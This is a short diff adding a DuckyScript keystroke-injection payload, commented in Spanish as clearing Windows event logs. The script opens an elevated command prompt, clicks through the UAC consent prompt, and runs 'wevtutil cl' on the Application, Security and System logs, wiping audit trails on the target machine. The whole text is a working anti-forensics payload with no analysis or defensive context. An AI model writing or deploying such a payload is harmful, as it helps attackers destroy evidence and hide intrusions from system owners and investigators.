@@ -1,0 +1,16 @@
+REM  Limpiar registros de eventos de Windows
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+STRING wevtutil cl Application
+ENTER
+STRING wevtutil cl Security
+ENTER
+STRING wevtutil cl System
+ENTER
+STRING exit
+ENTER
